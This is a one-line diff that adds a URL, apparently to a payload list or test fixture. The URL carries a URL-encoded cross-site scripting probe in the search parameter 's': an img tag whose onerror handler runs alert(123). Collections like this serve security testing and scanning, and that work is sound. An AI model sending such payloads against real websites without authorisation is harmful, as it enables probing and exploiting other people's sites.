@@ -1,0 +1,1 @@
+/?s=%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3B%3E
